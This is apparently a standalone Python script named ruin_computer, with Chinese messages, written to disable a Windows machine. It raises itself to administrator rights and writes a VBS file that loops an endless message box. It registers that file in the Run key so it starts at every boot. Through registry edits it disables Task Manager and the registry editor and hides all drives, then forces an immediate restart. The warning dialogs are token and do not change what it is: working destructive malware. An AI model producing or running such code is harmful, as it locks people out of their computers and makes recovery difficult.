# coding=utf-8
import ctypes
import os
import sys
import easygui
from tkinter.messagebox import showwarning


def is_admin() -> int:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return 0


def ruin_computer():
    if is_admin():
        if os.path.join(os.path.expanduser("~"), 'Desktop') in __file__:
            showwarning(message='请不要将此文件放在桌面！')
            exit()
        prompt1 = '请不要运行此程序！'
        user_choice1 = easygui.boolbox(msg=prompt1, choices=['继续', '退出'])
        if user_choice1:
            prompt2 = '如果执意运行，请先按照cb的指引安装Registry Workshop，如在不安装Registry Workshop的情况下运行此程序， 本人概不负责恢复电脑。'
            user_choice2 = easygui.boolbox(msg=prompt2, choices=['已安装', '退出'])
            if user_choice2:
                with open(file='./loop_window.vbs', mode='w', encoding='GBK') as f:
                    f.write('do\nmsgbox"赶紧找cb帮你关吧，你关不掉,一堆功能全都被我禁用了~"\nloop')
                os.system(r"reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v DisableTaskMgr /t REG_DWORD /d 1 /f")  # 通过cmd将任务管理器禁用
                os.system(r"reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ /v ruin_computer /t REG_SZ /d "+__file__.replace('main.py', 'loop_window.vbs')+" /f")
                os.system(r"reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\ /v NoDrives /t REG_DWORD /d 67108863 /f")
                os.system(r"reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\ /v NoViewOnDrive /t REG_DWORD /d 67108863 /f")
                os.system(r"reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v DisableRegistryTools /t REG_DWORD /d 1 /f")
                os.system(r"shutdown /r /f /t 0")
            else:
                exit()
        else:
            exit()
    else:
        if sys.version_info[0] == 3:  # 如果当前python版本是3.x（如果低于3.0会报错）
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)  # 申请以管理员权限重新执行该文件


if __name__ == "__main__":
    ruin_computer()
